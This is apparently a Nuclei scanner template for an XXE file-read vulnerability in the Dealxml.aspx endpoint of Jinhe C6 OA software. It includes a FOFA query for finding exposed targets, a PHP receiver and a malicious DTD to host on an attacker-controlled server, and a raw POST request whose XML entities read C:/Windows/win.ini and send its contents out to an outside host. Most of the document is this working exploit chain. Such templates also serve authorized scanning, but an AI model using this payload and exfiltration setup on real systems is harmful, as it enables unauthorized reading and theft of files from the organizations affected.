id: jinhe-c6-dealxml-xxe-lfi
info:
  name: "金和C6系统Dealxml.aspx接口XXE漏洞导致文件读取"
  author: 0dayPoc
  severity: medium
  description: |-
    fofa: app="金和网络-金和OA"
        攻击者可通过构造恶意XML实体利用XXE漏洞实现文件读取
        需在攻击者控制服务器部署以下组件：
        get.php
        <?php
        $data=$_GET['file'];
        $myfile = fopen("file.txt", "w+”);
        fwrite($myfile, $data);
        fclose($myfile);
        ?>
        
        xxe.dtd
        <!ENTITY % all "<!ENTITY send SYSTEM 'http://vpsip/get.php?file=%file;'>">
        
        漏洞利用时目标系统会将读取的文件内容通过HTTP请求发送至攻击者服务器
  tags: 金和C6
http:
- raw:
  - |
    POST /c6/JHSoft.Web.Appraise/Dealxml.aspx/ HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: close
    Content-Type: application/Xml

    <?xml version="1.0"?>
    <!DOCTYPE ANY[
    <!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
    <!ENTITY % remote SYSTEM "http://{{interactsh-url}}/xxe.dtd">
    %remote;
    %all;
    ]><root>&send;</root>
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: interactsh_protocol
    words:
    - "dns"
